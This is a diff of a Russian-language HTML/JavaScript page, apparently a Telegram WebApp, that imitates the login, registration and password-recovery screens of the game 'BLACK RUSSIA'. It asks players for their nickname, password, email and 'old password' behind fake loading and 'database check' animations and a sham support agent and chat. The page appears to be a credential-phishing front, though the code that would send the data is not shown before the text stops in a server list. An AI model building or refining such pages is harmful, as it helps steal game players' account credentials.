@@ -8,7 +8,6 @@
     <style>
         /* === ТВОИ ОРИГИНАЛЬНЫЕ СТИЛИ === */
         * { margin:0; padding:0; box-sizing:border-box; font-family:'Arial',sans-serif; }
-
         body {
             background: url('bg.jpg') no-repeat center center fixed;
             background-size: cover;
@@ -22,7 +21,6 @@
             position: relative;
             overflow-x: hidden;
         }
-
         body::before {
             content: '';
             position: fixed;
@@ -32,7 +30,7 @@
             z-index: -1;
         }
 
-        /* === НОВАЯ ЗАГРУЗКА ПРИ СТАРТЕ === */
+        /* === ЗАГРУЗКА ПРИ СТАРТЕ === */
         #startup-loader { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: radial-gradient(circle at center,#1a0000 0%,#050000 100%); 
@@ -55,29 +53,26 @@
         }
         #check-modal.show { display: flex; }
 
-        /* === ОСТАЛЬНОЙ ДИЗАЙН === */
+        /* === ОСТАЛЬНОЙ ТВОЙ ДИЗАЙН === */
         .container { width:100%; max-width:400px; padding:15px 0; animation:fadeIn 0.6s ease; }
         @keyframes fadeIn { from { opacity:0; transform:translateY(15px); } to { opacity:1; transform:translateY(0); } }
-
         .logo { text-align:center; margin-bottom:25px; }
         .tiger-img { width:90px; height:90px; object-fit:contain; margin-bottom:5px; }
         .logo h1 { font-size:26px; font-weight:bold; letter-spacing:1px; color:#bbb; }
         .logo h1 span { color:#a01010; }
         .logo p { color:#a01010; font-size:10px; letter-spacing:3px; margin-top:5px; }
-
-        .form-row { background-color:#0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 8px 16px; margin-bottom: 12px; display: flex; align-items: center; box-sizing: border-box; height: 58px; width: 100%; transition: border-color 0.2s; }
+        .form-box { display: none; width: 100%; box-sizing: border-box; }
+        .form-box.active { display: block; }
+        
+        .form-row { background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 8px 16px; margin-bottom: 12px; display: flex; align-items: center; box-sizing: border-box; height: 58px; width: 100%; transition: border-color 0.2s; }
         .form-row:focus-within, .form-row.dropdown-open { border-color: #b31212; }
-        .row-icon-left { width: 32px; height: 32px; border-radius: 8px; display: flex; justify-content: center; align-items: center; margin-right: 15px; flex-shrink: 0; background: linear-gradient(135deg, #e51b1b, #8a0606); }
-        .row-icon-left svg { width: 18px; height: 18px; fill: #ffffff; }
-        .row-main { flex-grow: 1; min-width: 0; }
-        .row-main label { display: block; font-size: 9px; color: #574e4e; text-transform: uppercase; font-weight: bold; margin-bottom: 2px; }
-        .row-main input { width: 100%; background: none; border: none; color: #ffffff; font-size: 13px; outline: none; padding: 0; box-sizing: border-box; }
-
-        .selected-server-text { color: #ffffff; font-size: 13px; margin-top: 2px; }
+        .form-row.shake { animation: shakeAnim 0.4s ease-in-out; border-color: #e51b1b !important; }
+        @keyframes shakeAnim { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-6px); } 40%, 80% { transform: translateX(6px); } }
         .clickable-row { cursor: pointer; user-select: none; }
-        .select-arrow-down { font-size: 10px; color: #e51b1b; margin-left: auto; user-select: none; transition: 0.2s; }
-        .select-arrow-down.rotated { transform: rotate(180deg); }
-
+        .selected-server-text { color: #ffffff; font-size: 13px; margin-top: 2px; }
+        .server-select-box-wrapper { position: relative; margin-bottom: 12px; width: 100%; box-sizing: border-box; }
+        .server-select-box-wrapper .form-row { margin-bottom: 0; }
+        
         .custom-server-dropdown {
             position: fixed; bottom: 0; left: 50%; transform: translateX(-50%) translateY(100%);
             width: 100%; max-width: 380px; max-height: 50vh; background-color: #0b0303; border: 1px solid #1a0b0b;
@@ -88,27 +83,70 @@
         .server-item { padding: 10px 16px; display: flex; align-items: center; cursor: pointer; font-size: 13px; color: #ffffff; transition: 0.15s; font-weight: 500; }
         .server-item:hover { background-color: #1a0b0b; color: #e51b1b; }
         .server-num-badge { color: #ff512f; font-weight: bold; margin-right: 8px; }
-
-        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(90deg, #940f0f 0%, #d61818 100%); border: none; border-radius: 10px; color: #ffffff; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; box-sizing: border-box; margin-top: 5px; }
-        .text-or { text-align: center; color: #3b3232; font-size: 11px; text-transform: uppercase; margin: 15px 0; user-select: none; }
+        
+        .split-pincode-container { display: flex; margin-bottom: 12px; height: 58px; width: 100%; box-sizing: border-box; }
+        .split-pincode-container.disabled-style { opacity: 0.35; }
+        .form-row-pin { background-color: #0b0303; border: 1px solid #1a0b0b; border-right: none; border-radius: 10px 0 0 10px; padding: 8px 16px; display: flex; align-items: center; box-sizing: border-box; height: 100%; flex-grow: 1; }
+        .pincode-checkbox-wrapper { background-color: #0b0303; border: 1px solid #1a0b0b; border-left: none; border-radius: 0 10px 10px 0; padding: 8px 16px; display: flex; align-items: center; gap: 12px; height: 100%; box-sizing: border-box; flex-shrink: 0; }
+        .row-icon-left { width: 32px; height: 32px; border-radius: 8px; display: flex; justify-content: center; align-items: center; margin-right: 15px; flex-shrink: 0; transition: background 0.3s; }
+        .row-icon-left svg { width: 18px; height: 18px; fill: #ffffff; }
+        .bg-orange { background: linear-gradient(135deg, #ff512f, #dd2476); }
+        .bg-red { background: linear-gradient(135deg, #e51b1b, #8a0606); }
+        .bg-darkred { background: linear-gradient(135deg, #940f0f, #4a0202); }
+        .bg-pink { background: linear-gradient(135deg, #f857a6, #ff5858); }
+        .status-invalid { background: #a61c1c !important; } 
+        .status-valid { background: #1ca632 !important; }
+        .row-icon-right { width: 20px; height: 20px; margin-left: 10px; flex-shrink: 0; display: flex; justify-content: center; align-items: center; }
+        .opacity-5 { opacity: 0.5; } .clickable { cursor: pointer; }
+        .select-arrow-down { font-size: 10px; color: #e51b1b; margin-left: auto; user-select: none; transition: 0.2s; }
+        .select-arrow-down.rotated { transform: rotate(180deg); }
+        .row-main { flex-grow: 1; min-width: 0; }
+        .row-main label { display: block; font-size: 9px; color: #574e4e; text-transform: uppercase; font-weight: bold; margin-bottom: 2px; }
+        .row-main input { width: 100%; background: none; border: none; color: #ffffff; font-size: 13px; outline: none; padding: 0; box-sizing: border-box; }
+        .row-main input::placeholder { color: #4f4343; transition: opacity 0.15s ease; }
+        .row-main input:focus::placeholder { opacity: 0; }
+        .pincode-text { font-size: 9px; color: #ffffff; text-transform: uppercase; text-align: right; line-height: 1.3; font-weight: bold; user-select: none; }
+        .launcher-check { width: 18px; height: 18px; accent-color: #c91a1a; cursor: pointer; }
+        
+        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(90deg, #940f0f 0%, #d61818 100%); border: none; border-radius: 10px; color: #ffffff; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; box-sizing: border-box; }
+        .text-or { text-align: center; color: #3b3232; font-size: 11px; text-transform: uppercase; margin-bottom: 15px; user-select: none; }
         .nav-switch-btn { width: 100%; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 15px; display: flex; justify-content: space-between; align-items: center; color: #8c8080; font-size: 10px; text-transform: uppercase; cursor: pointer; margin-bottom: 15px; font-weight: bold; user-select: none; box-sizing: border-box; }
+        .red-icon-inline { color: #d12727; margin-right: 12px; } .gray-arrow { color: #443a3a; font-size: 11px; }
         
-        .form-box { display: none; width: 100%; box-sizing: border-box; }
-        .form-box.active { display: block; }
-        
-        /* Модалка поддержки */
         .support-modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(5, 1, 1, 0.98); z-index: 500; border-radius: 15px; display: flex; flex-direction: column; padding: 20px; box-sizing: border-box; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
         .support-modal-overlay.show { opacity: 1; pointer-events: auto; }
         .support-modal-title { font-size: 14px; font-weight: bold; text-transform: uppercase; color: #e51b1b; text-align: center; margin-bottom: 12px; }
         .agent-card { width: 100%; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; box-sizing: border-box; }
+        .agent-info { display: flex; align-items: center; gap: 12px; min-width: 0; }
+        .agent-avatar { width: 36px; height: 36px; background: linear-gradient(135deg, #940f0f, #d61818); border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .agent-avatar svg { width: 22px; height: 22px; fill: #ffffff; }
+        .agent-name { font-size: 11px; font-weight: bold; color: white; margin-bottom: 2px; }
+        .agent-role { font-size: 8.5px; color: #6e6464; text-transform: uppercase; font-weight: bold; letter-spacing: 0.5px; }
         .btn-agent-vk { background-color: #0077ff; border: none; border-radius: 6px; color: white; font-size: 9px; font-weight: bold; padding: 8px 12px; cursor: pointer; text-transform: uppercase; flex-shrink: 0; }
-        .btn-support-close { width: 100%; padding: 12px; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; color: #574e4e; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; text-align: center; box-sizing: border-box; margin-top: auto;}
-        .bottom-support-clickable { display: flex; justify-content: center; color: #e51b1b; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; margin-top: 15px;}
+        .btn-support-chat { width: 100%; padding: 12px; background-color: #1c0606; border: 1px solid #e51b1b; border-radius: 10px; color: #e51b1b; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; text-align: center; margin-top: auto; margin-bottom: 10px; box-sizing: border-box; }
+        .btn-support-close { width: 100%; padding: 12px; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; color: #574e4e; font-size: 11px; font-weight: bold; text-transform: uppercase; cursor: pointer; text-align: center; box-sizing: border-box; }
+        .chat-container-box { display: none; flex-direction: column; height: 100%; width: 100%; position: absolute; top: 0; left: 0; background-color: #050101; z-index: 510; border-radius: 15px; padding: 15px; box-sizing: border-box; }
+        .chat-container-box.show { display: flex; }
+        .chat-header { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #1a0b0b; padding-bottom: 10px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
+        .chat-title-info { display: flex; align-items: center; gap: 10px; }
+        .chat-title-info .status-dot { width: 6px; height: 6px; background-color: #1ca632; border-radius: 50%; box-shadow: 0 0 8px #1ca632; }
+        .chat-title-text { font-size: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+        .btn-chat-back { background: none; border: 1px solid #1a0b0b; color: #574e4e; font-size: 11px; font-weight: bold; border-radius: 6px; padding: 4px 10px; cursor: pointer; text-transform: uppercase; }
+        .chat-messages-area { flex-grow: 1; overflow-y: auto; padding: 5px; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
+        .chat-bubble { max-width: 80%; padding: 10px 14px; border-radius: 12px; font-size: 12px; line-height: 1.4; word-wrap: break-word; }
+        .chat-bubble.agent { background-color: #0b0303; border: 1px solid #1a0b0b; align-self: flex-start; color: #ffffff; border-top-left-radius: 2px; }
+        .chat-bubble.user { background-color: #e51b1b; align-self: flex-end; color: #ffffff; border-top-right-radius: 2px; }
+        .chat-bubble-sender { font-size: 8px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; color: #574e4e; margin-bottom: 3px; }
+        .chat-bubble.user .chat-bubble-sender { color: #ffb3b3; }
+        .chat-input-row { display: flex; align-items: center; background-color: #0b0303; border: 1px solid #1a0b0b; border-radius: 10px; padding: 6px 12px; height: 46px; width: 100%; box-sizing: border-box; }
+        .chat-input-row input { flex-grow: 1; background: none; border: none; color: white; font-size: 12px; outline: none; min-width: 0; }
+        .btn-chat-send { background: none; border: none; color: #e51b1b; font-size: 14px; cursor: pointer; padding-left: 10px; display: flex; align-items: center; }
+        .bottom-support-btn-container { display: flex; justify-content: center; margin-top: 5px; width: 100%; }
+        .bottom-support-clickable { display: flex; align-items: center; gap: 8px; color: #e51b1b; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; cursor: pointer; user-select: none; }
     </style>
 </head>
 <body>
-
-    <!-- ЭКРАН ЗАГРУЗКИ ПРИ СТАРТЕ -->
+    <!-- 1. ЗАГРУЗКА ПРИ СТАРТЕ -->
     <div id="startup-loader">
         <div class="load-spinner"></div>
         <div class="load-text">Загрузка данных сервера</div>
@@ -116,7 +154,7 @@
         <div class="load-bar"><div class="load-bar-fill" id="start-bar"></div></div>
     </div>
 
-    <!-- МОДАЛКА 6 СЕК ПРОВЕРКИ -->
+    <!-- 2. 6-СЕКУНДНАЯ ПРОВЕРКА -->
     <div id="check-modal">
         <div class="load-spinner"></div>
         <div class="load-text" style="color: #fff; font-size: 14px;">Проверка баз данных</div>
@@ -130,142 +168,222 @@
         <div id="support-modal" class="support-modal-overlay">
             <div class="support-modal-title">Служба Поддержки</div>
             <div class="agent-card">
-                <div>
-                    <div style="font-size: 11px; font-weight: bold; color: white;">Технический спец. агент №1</div>
-                    <div style="font-size: 8.5px; color: #6e6464; text-transform: uppercase;">Бахида Тадакатцу</div>
+                <div class="agent-info">
+                    <div class="agent-avatar"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12c0 3.1.1 5.3 1 7.2h2c-.6-1.5-.7-3-.7-5.2 0-4.4 3.1-8 7.7-8s7.7 3.6 7.7 8c0 1.2-.2 2.6-.6 3.6l1.6.8c.6-1.2.9-2.8.9-4.4 0-4.97-4.03-9-9-9z"/></svg></div>
+                    <div>
+                        <div class="agent-name">Технический спец. агент №1</div>
+                        <div class="agent-role">Бахида Тадакатцу</div>
+                    </div>
                 </div>
                 <button class="btn-agent-vk" onclick="window.open('https://vk.com')">Связаться</button>
             </div>
+            <button class="btn-support-chat" onclick="openInternalOnlineChat()">Открыть онлайн-чат поддержки</button>
             <button class="btn-support-close" onclick="toggleSupportModal(false)">Вернуться назад</button>
         </div>
 
-        <!-- Шапка -->
+        <!-- ВНУТРЕННИЙ ЧАТ -->
+        <div id="internal-chat-box" class="chat-container-box">
+            <div class="chat-header">
+                <div class="chat-title-info"><div class="status-dot"></div><div class="chat-title-text">Чат с техподдержкой</div></div>
+                <button class="btn-chat-back" onclick="closeInternalOnlineChat()">Назад</button>
+            </div>
+            <div class="chat-messages-area" id="chat-messages-container">
+                <div class="chat-bubble agent"><div class="chat-bubble-sender">Тех. Агент</div>Здравствуйте! Опишите проблему, и мы постараемся помочь.</div>
+            </div>
+            <div class="chat-input-row">
+                <input type="text" placeholder="Введите сообщение..." id="chat-user-message-input" autocomplete="off">
+                <button class="btn-chat-send" onclick="sendUserMessageInChat()">➔</button>
+            </div>
+        </div>
+
+        <!-- ШАПКА -->
         <div class="logo">
             <img src="logo.png" alt="BR" class="tiger-img" onerror="this.style.display='none'">
             <h1>BLACK <span>RUSSIA</span></h1>
-            <p id="auth-subtitle">✦ ВОССТАНОВЛЕНИЕ ✦</p>
+            <p id="auth-subtitle">✦ ВХОД В АККАУНТ ✦</p>
         </div>
 
         <!-- ЭКРАН ВХОДА -->
         <div id="screen-login" class="form-box active">
-            <div class="form-row">
-                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-                <div class="row-main"><label>Ник</label><input type="text" id="nick-input" placeholder="Введите игровой ник"></div>
+            <div class="form-row" id="row-login-nick">
+                <div class="row-icon-left bg-orange" id="nick-icon-bg"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+                <div class="row-main"><label>Ник</label><input type="text" placeholder="Введите игровой ник" id="nick-input"></div>
             </div>
-            <div class="form-row">
-                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
-                <div class="row-main"><label>Пароль</label><input type="password" id="login-password-input" placeholder="Введите пароль"></div>
+            <div class="form-row" id="row-login-pass">
+                <div class="row-icon-left bg-red" id="pass-icon-bg"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="row-main"><label>Пароль</label><input type="password" placeholder="Введите пароль" id="login-password-input"></div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('login-password-input')">👁</div>
             </div>
-            <div class="form-row clickable-row" id="server-field-trigger">
-                <div class="row-icon-left" style="background: linear-gradient(135deg, #ff512f, #dd2476);">☰</div>
-                <div class="row-main"><label>Выбор сервера</label><div class="selected-server-text" id="current-selected-server" style="color:#4f4343;">Выберите сервер</div></div>
-                <div class="select-arrow-down" id="server-arrow-icon">▼</div>
+            <div class="server-select-box-wrapper">
+                <div class="form-row clickable-row" id="server-field-trigger">
+                    <div class="row-icon-left bg-pink" id="server-icon-bg"><svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/></svg></div>
+                    <div class="row-main"><label>Выбор сервера</label><div class="selected-server-text" id="current-selected-server" style="color:#4f4343;">Выберите сервер</div></div>
+                    <div class="select-arrow-down" id="server-arrow-icon">▼</div>
+                </div>
             </div>
-            <button class="btn-primary" onclick="alert('Вход в разработке');">Войти в аккаунт →</button>
+            <button class="btn-primary" onclick="handleLoginClick()">Войти в аккаунт →</button>
             <div class="text-or">или</div>
             <div class="nav-switch-btn" onclick="changeAuthScreen('recovery')">
-                <span>🔓 Восстановление пароля</span><span>❯</span>
+                <span><span class="red-icon-inline">🔓</span> Восстановление пароля</span><span class="gray-arrow">❯</span>
+            </div>
+            <div class="nav-switch-btn" onclick="changeAuthScreen('register')">
+                <span><span class="red-icon-inline">📝</span> Создать новый аккаунт</span><span class="gray-arrow">❯</span>
+            </div>
+        </div>
+
+        <!-- ЭКРАН РЕГИСТРАЦИИ -->
+        <div id="screen-register" class="form-box">
+            <div class="form-row" id="row-reg-nick">
+                <div class="row-icon-left bg-orange" id="reg-nick-icon-bg"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+                <div class="row-main"><label>Ник нового аккаунта</label><input type="text" placeholder="Пример: Alexander_Gromov" id="reg-nick-input"></div>
+            </div>
+            <div class="form-row" id="row-reg-pass">
+                <div class="row-icon-left bg-red" id="reg-pass-icon-bg"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="row-main"><label>Пароль</label><input type="password" placeholder="Придумайте пароль" id="reg-password-input"></div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('reg-password-input')">👁</div>
+            </div>
+            <div class="form-row" id="row-reg-email">
+                <div class="row-icon-left bg-orange" id="reg-email-icon-bg"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1 .9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></div>
+                <div class="row-main"><label>Ваша почта</label><input type="email" placeholder="example@mail.ru" id="reg-email-input"></div>
+            </div>
+            <div class="form-row clickable-row" onclick="triggerServerDropdownFromReg(event)" id="row-reg-server">
+                <div class="row-icon-left bg-red" id="reg-server-icon-bg"><svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/></svg></div>
+                <div class="row-main"><label>Выбор сервера</label><div class="selected-server-text" id="reg-selected-server-text" style="color: #4f4343;">Выберите сервер</div></div>
+                <div class="select-arrow-down">▼</div>
+            </div>
+            <button class="btn-primary" onclick="handleRegisterClick()">Создать аккаунт →</button>
+            <div class="text-or">или</div>
+            <div class="nav-switch-btn" onclick="changeAuthScreen('login')">
+                <span><span class="red-icon-inline">⬅</span> Вернуться к входу</span><span class="gray-arrow">❯</span>
             </div>
         </div>
 
         <!-- ЭКРАН ВОССТАНОВЛЕНИЯ -->
         <div id="screen-recovery" class="form-box">
-            <div class="form-row">
-                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-                <div class="row-main"><label>Ник</label><input type="text" id="rec-nick-input" placeholder="Введите игровой ник"></div>
+            <div class="form-row" id="row-rec-nick">
+                <div class="row-icon-left bg-orange" id="rec-nick-icon-bg"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
+                <div class="row-main"><label>Ник</label><input type="text" placeholder="Введите игровой ник" id="rec-nick-input"></div>
             </div>
-            <div class="form-row">
-                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
-                <div class="row-main"><label>Старый пароль</label><input type="password" id="rec-old-pass" placeholder="Введите старый пароль"></div>
+            <div class="form-row" id="row-rec-oldpass">
+                <div class="row-icon-left bg-red" id="rec-old-pass-bg"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="row-main"><label>Старый пароль</label><input type="password" placeholder="Введите старый пароль" id="rec-old-pass"></div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('rec-old-pass')">👁</div>
             </div>
-            <div class="form-row">
-                <div class="row-icon-left"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
-                <div class="row-main"><label>Новый пароль</label><input type="password" id="rec-new-pass" placeholder="Введите новый пароль"></div>
+            <div class="form-row" id="row-rec-newpass">
+                <div class="row-icon-left bg-red" id="rec-new-pass-bg"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                <div class="row-main"><label>Новый пароль</label><input type="password" placeholder="Введите новый пароль" id="rec-new-pass"></div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('rec-new-pass')">👁</div>
             </div>
-            <div class="form-row clickable-row" onclick="triggerServerDropdownFromReg(event)">
-                <div class="row-icon-left" style="background: linear-gradient(135deg, #ff512f, #dd2476);">☰</div>
-                <div class="row-main"><label>Выбор сервера</label><div class="selected-server-text" id="rec-selected-server-text" style="color:#4f4343;">Выберите сервер</div></div>
-                <div class="select-arrow-down" id="server-arrow-icon-rec">▼</div>
+            <div class="form-row clickable-row" onclick="triggerServerDropdownFromReg(event)" id="row-rec-server">
+                <div class="row-icon-left bg-pink" id="rec-server-icon-bg"><svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/></svg></div>
+                <div class="row-main"><label>Выбор сервера</label><div class="selected-server-text" id="rec-selected-server-text" style="color: #4f4343;">Выберите сервер</div></div>
+                <div class="select-arrow-down">▼</div>
             </div>
             <button class="btn-primary" onclick="handleRecoveryClick()">Восстановить пароль →</button>
             <div class="text-or">или</div>
             <div class="nav-switch-btn" onclick="changeAuthScreen('login')">
-                <span>⬅ Вернуться к входу</span><span>❯</span>
+                <span><span class="red-icon-inline">⬅</span> Вернуться к входу</span><span class="gray-arrow">❯</span>
             </div>
         </div>
 
-        <div class="bottom-support-clickable" onclick="toggleSupportModal(true)">Служба поддержки</div>
+        <!-- Кнопка поддержки внизу -->
+        <div class="bottom-support-btn-container" id="launcher-bottom-support">
+            <div class="bottom-support-clickable" onclick="toggleSupportModal(true)">Служба поддержки</div>
+        </div>
+
+        <!-- Выпадающий список серверов -->
         <div class="custom-server-dropdown" id="custom-server-list"></div>
     </div>
 
+    <!-- === ВЕСЬ JAVASCRIPT ЗДЕСЬ === -->
     <script>
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.ready(); tg.expand(); }
 
-        // === ЗАГРУЗКА ПРИ СТАРТЕ ===
+        // === 1. ЗАГРУЗКА ПРИ СТАРТЕ (0-100%) ===
         let startP = 0;
         const startInterval = setInterval(() => {
             startP += 2;
-            document.getElementById('start-percent').textContent = startP + '%';
-            document.getElementById('start-bar').style.width = startP + '%';
+            const elPercent = document.getElementById('start-percent');
+            const elBar = document.getElementById('start-bar');
+            if (elPercent) elPercent.textContent = startP + '%';
+            if (elBar) elBar.style.width = startP + '%';
+            
             if (startP >= 100) {
                 clearInterval(startInterval);
-                setTimeout(() => { document.getElementById('startup-loader').style.display = 'none'; }, 300);
+                setTimeout(() => {
+                    const loader = document.getElementById('startup-loader');
+                    if (loader) loader.style.display = 'none';
+                }, 300);
             }
         }, 30);
 
+        // === 2. ПЕРЕКЛЮЧЕНИЕ ЭКРАНОВ ===
         function changeAuthScreen(t) {
             document.getElementById('screen-login').style.display = (t === 'login' ? 'block' : 'none');
+            document.getElementById('screen-register').style.display = (t === 'register' ? 'block' : 'none');
             document.getElementById('screen-recovery').style.display = (t === 'recovery' ? 'block' : 'none');
-            document.getElementById('auth-subtitle').innerText = (t === 'login') ? '✦ ВОССТАНОВЛЕНИЕ ✦' : '✦ ВОССТАНОВЛЕНИЕ ПАРОЛЯ ✦';
+            
+            const sub = document.getElementById('auth-subtitle');
+            if(sub) { 
+                if(t==='login') sub.innerText='✦ ВХОД В АККАУНТ ✦'; 
+                if(t==='register') sub.innerText='✦ РЕГИСТРАЦИЯ ✦'; 
+                if(t==='recovery') sub.innerText='✦ ВОССТАНОВЛЕНИЕ ✦'; 
+            } 
         }
-        function toggleSupportModal(s) { const m = document.getElementById("support-modal"); if (m) m.classList.toggle("show", s); }
 
-        // === ПОЛНЫЙ СПИСОК СЕРВЕРОВ ===
-        const brServers = [
-            "RED","GREEN","BLUE","YELLOW","ORANGE","PURPLE","LIME","PINK","CHERRY","BLACK","INDIGO","WHITE",
